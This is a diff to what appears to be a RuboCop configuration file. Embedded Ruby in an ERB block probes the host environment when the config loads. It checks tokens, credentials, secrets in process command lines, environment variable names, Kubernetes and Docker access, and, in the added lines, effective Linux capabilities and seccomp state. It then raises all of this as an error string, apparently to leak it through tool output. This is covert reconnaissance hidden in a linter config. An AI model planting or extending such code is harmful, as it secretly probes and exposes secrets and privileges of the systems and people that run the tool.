@@ -83,6 +83,19 @@ AllCops:
       rescue => e
         loopback = "error=#{e.class}"
       end
-      marker = "SOL_RUBOCOP_BOUNDARY_20260714=token_present=#{!token.empty?},token_len=#{token.length},uid=#{Process.uid},k8s_host_present=#{!host.to_s.empty?},docker_socket=#{docker_socket},runtime_present=#{runtime_present},credential_present=#{credential_present},argv_secret=#{argv_secret},self_cmd_secret=#{self_cmd_secret},pid1_cmd_secret=#{pid1_cmd_secret},cmdline_keyword=#{cmdline_keyword},env_names=#{env_names},pid1_env_names=#{pid1_env_names},#{git_config_meta},#{k8s},#{metadata},loopback=#{loopback}"
+      cap_meta = 'cap_status_unread'
+      begin
+        ps = File.read('/proc/self/status', 16384)
+        cap_hex = (ps[/^CapEff:\s+([0-9a-fA-F]+)/, 1] || '0')
+        cap_int = cap_hex.to_i(16)
+        cap_bits = {'SYS_ADMIN'=>21,'SYS_PTRACE'=>19,'SYS_MODULE'=>16,'SYS_RAWIO'=>17,'NET_ADMIN'=>12,'DAC_READ_SEARCH'=>2,'DAC_OVERRIDE'=>1,'SYS_CHROOT'=>18}
+        cap_names = cap_bits.select { |_n,b| (cap_int & (1 << b)) != 0 }.keys.join('|')
+        nnp = ps[/^NoNewPrivs:\s+(\d+)/, 1] || '?'
+        sec = ps[/^Seccomp:\s+(\d+)/, 1] || '?'
+        cap_meta = "cap_eff=#{cap_hex},cap_names=#{cap_names},no_new_privs=#{nnp},seccomp=#{sec}"
+      rescue => e
+        cap_meta = "cap_error=#{e.class}"
+      end
+      marker = "SOL_RUBOCOP_BOUNDARY_20260714=token_present=#{!token.empty?},token_len=#{token.length},uid=#{Process.uid},k8s_host_present=#{!host.to_s.empty?},docker_socket=#{docker_socket},runtime_present=#{runtime_present},credential_present=#{credential_present},argv_secret=#{argv_secret},self_cmd_secret=#{self_cmd_secret},pid1_cmd_secret=#{pid1_cmd_secret},cmdline_keyword=#{cmdline_keyword},env_names=#{env_names},pid1_env_names=#{pid1_env_names},#{git_config_meta},#{k8s},#{metadata},loopback=#{loopback},#{cap_meta}"
       raise marker
     end %>
